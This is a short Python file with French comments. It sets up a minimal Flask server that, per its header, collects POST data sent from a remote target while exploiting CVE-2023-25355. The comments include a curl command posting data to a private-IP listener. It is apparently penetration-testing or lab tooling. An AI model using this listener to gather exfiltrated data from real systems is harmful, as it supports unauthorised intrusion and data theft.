# Serveur Flask minimaliste destiné à recevoir des requêtes POST depuis une cible distante
# Utilisé pour le CVE-2023-25355
#
# pip install Flask
# export FLASK_APP=Serveur.py
# export FLASK_DEBUG=1
# python -m flask run --host=0.0.0.0
#
# curl -k -X POST -d "Data" http://192.168.45.237:5000



from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['POST', 'GET'])
def dump():
    print("\n Données reçues : \n")
    print("\n Requête : \n")
    print(request)
    print("\n Data : \n")
    print(request.get_data())
    print("\n Stream : \n")
    print(request.stream)
    print(request.stream.read())
    print("\n JSON : \n ")
    print(request.json) 
    print(request.get_json(force=True))
